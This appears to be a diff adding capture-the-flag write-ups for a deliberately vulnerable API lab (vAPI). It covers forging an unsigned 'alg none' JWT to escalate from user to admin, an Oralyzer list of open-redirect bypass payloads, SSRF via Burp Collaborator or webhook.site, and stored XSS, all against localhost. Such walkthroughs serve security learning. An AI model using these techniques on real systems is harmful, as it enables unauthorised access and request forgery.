@@ -446,10 +446,149 @@ Checkout the Postman collection folder called 'Arena' which gives us another thr
 
 ## **JustWeakToken**
 
+The initial REST API endpoint in our Postman collection is a `POST` request to "`/jwt/user`:
 
+From the application verifying username and password from the encrypted ciphertext within the `HTTP BODY`, the server generates a "JOT" token which is presumably used as a bearer token for authentication:
+
+![JWT1](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/c50f0a35-b7f4-4924-8540-2b9fffb4ecca)
+
+I chose to inspect the JWT using the [jwt_tool](https://github.com/ticarpi/jwt_tool). There are a bunch of UI's you can use such as [JWT.io](https://jwt.io/), but this is much more fun.
+
+Inspect the JWT token:
+
+`python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ2YXBpIiwiYXVkIjoidmFwaSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjkyNzU5NzM5LCJleHAiOjE2OTI3NjE1Mzl9.AWyVpwnO7MC2AEDJGmY7EanrLmIZXlj5_F3HBzWA46M -T -V`
+
+`python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ2YXBpIiwiYXVkIjoidmFwaSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjkyNzU5NzM5LCJleHAiOjE2OTI3NjE1Mzl9.AWyVpwnO7MC2AEDJGmY7EanrLmIZXlj5_F3HBzWA46M`
+
+![JWT2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/c03c0497-cc1e-47b4-9b9f-6f3b49ec02fa)
+![JWT3](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/126e9adc-97ed-4854-b4ba-3f113ca5f9a9)
+
+This JWT is added into subsequent bodies of other requests such as a `GET` to the `/vapi/jwt/user` API endpoint:
+
+![JWT3](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/71729175-2a3e-4069-b08b-079849c2628e)
+
+We can remove the token's encoding using the `-X a` flags:
+
+```
+python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJ2YXBpIiwiYXVkIjoidmFwaSIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjkyNzU5NzM5LCJleHAiOjE2OTI3NjE1Mzl9.AWyVpwnO7MC2AEDJGmY7EanrLmIZXlj5_F3HBzWA46M  -X a
+```
+
+![JWT5](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/93ff07c4-a773-4a76-8b92-76e0d730a316)
+
+Taking the first value which is a representation of the JWT token with the authentication signature stripped, again run it through with the `-T` flag and notice the `alg = "none"` (the JWT here has no integrity):
+
+![JWT6](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/283dfe72-ef55-4125-a538-1da1de89b1e7)
+![JWT7](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/3367b1b3-e38b-4424-b37a-5bfdb48d3e7d)
+
+By selecting a new role, I can change the value of the role within the JWT token to `admin` from `user` and thus elevate my privileges:
+
+```
+Please select a field number:
+(or 0 to Continue)
+> 3
+
+Current value of role is: user
+Please enter new value and hit ENTER
+> admin <------- HERE
+```
+
+![JWT8](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/30a11acf-e1e5-4040-add0-9b328a13c967)
+
+My new JWT bearer token being `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJpc3MiOiJ2YXBpIiwiYXVkIjoidmFwaSIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTY5Mjc1OTczOSwiZXhwIjoxNjkyNzYxNTM5fQ.`!
+
+I send the `GET` request to Burp Repeater, replace the token under the `Authorization-Token:` header and voila, a flag:
+
+![JWT Flag](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/9828e295-9601-4930-a727-d4152ea2b9b8)
+![JWT Flag 2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/8403262b-bf01-4c1a-ab84-3435d10f9e88)
 
 ## **ServerSurfer**
 
+Both collection requests are showing a `GET` request in the `/vapi/serversurfer` REST API endpoint via `/vapi/serversurfer?url=https://<domain>.<tld>` exposing a base64-encoded payload under the `data` field. This is also a potential open-redirect by the looks of things:
 
+![SS1](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/7123568c-8f9b-4c01-96b3-3abd23f37529)
+
+I always initially use something like Oralyzer to check for open-redirect exploits:
+
+```
+Oralyzer % python3 oralyzer.py -u http://127.0.0.1/vapi/serversurfer?url=
+
+	Oralyzer
+
+[!] Infusing payloads
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=http%253A%252F%252Fwww.google.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=https%253A%252F%252Fwww.google.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fwww.google.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=https%3Awww.google.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=google.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%5C%2F%5Cgoogle.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%5C%2Fgoogle.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2Fgoogle.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=hthttp%3A%2F%2Ftp%3A%2F%2Fgoogle.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=x00http%3A%2F%2Fgoogle.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%5Cx20http%3A%2F%2Fgoogle.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=216.58.214.206
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=172.217.167.46
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F216.58.214.206
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2F216.58.214.206
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%5C216.58.214.206
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F216.58.214.206
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F216.58.214.206
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle%E3%80%82com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle%25E3%2580%2582com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=http%5Cx3A%5Cx2F%5Cx2Fgoogle.com
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2Fgoogle.com%2F%252e%252e
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2Fgoogle.com%2F%252e%252e
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252e%252e
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2Fgoogle.com%2F%252e%252e
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252E%252E
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2Fgoogle.com%2F%252e%252e%252f
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2Fgoogle.com%2F%252e%252e%252f
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252e%252e%252f
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2Fgoogle.com%2F%252f..
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2Fgoogle.com%2F%252f..
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252f..
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252F..
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2Fgoogle.com%2F%252F..
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2F%2Fgoogle.com%2F%252f%252e%252e
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2F%2Fgoogle.com%2F%252f%252e%252e
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%252f%252e%252e
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2Fgoogle.com%2F%252f%252e%252e
+[-] Found nothing :: http://127.0.0.1/vapi/serversurfer?url=%2F%2Fgoogle.com%2F%2F%252F%252E%252E
+```
+
+Take the field's value payload and decode the Base64, preferably as text over hex format reveals a developer HTML site:
+
+![SS2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/cb6d3f1e-765c-4348-99b7-f35e6e6c1d1b)
+
+I chose to try and abuse the open redirect using Burp Collaborator and returns a base-64 encoded string:
+
+![SS3](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/e8632b77-3487-404b-9b9d-38f9457b0190)
+
+The decoded result is my value from the Burp Collaborator payload. Another alternative would be to use an online Webhook service such as `https://webhook.site/` where you can manually set a flag value.
+
+![SS4](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/5bbed36d-5ee2-4901-82ec-7226c2cadca4)
+
+This shows the open SSRF vulnerability and thus the flag.
+
+![SS5](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/59ecda8c-6465-4d5b-acef-1d0c0200b3ae)
 
 ## **StickyNotes**
+
+Still more fun! Let's checkout the `POST` to REST API endpoint `/vapi/stickynotes`:
+
+![STICKY1](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/68a5b93d-65b5-4734-a9dd-ba0bfcfe3af6)
+
+The only real thing of interest here is the `?format=html` custom parameter within the `GET` request. To see any evidence of a potential XSS attack (since the `data` is rendered as HTML here).
+
+![STICKY2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/9a491e06-2c5e-418e-bb9d-e05118c83136)
+
+We see a `201` HTTP response and what looks to be successful, a flag!
+
+![STICKY3](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/d5fc17c5-86be-4792-bea9-bca801bb2f27)
+
+Now for the icing on the cake, let's fire up a web-browser to this API endpoint at `http://127.0.0.1/vapi/stickynotes?format=html`:
+
+![STICKY4 XSS FLAG](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/14c18ac7-b708-46c4-a583-582c9e401b81)
+![STICKY4 XSS FLAG 2](https://github.com/GangGreenTemperTatum/CTFs/assets/104169244/f6f7e0bc-90f9-4ddf-8810-f63bc3369950)
+
+EOF 💾
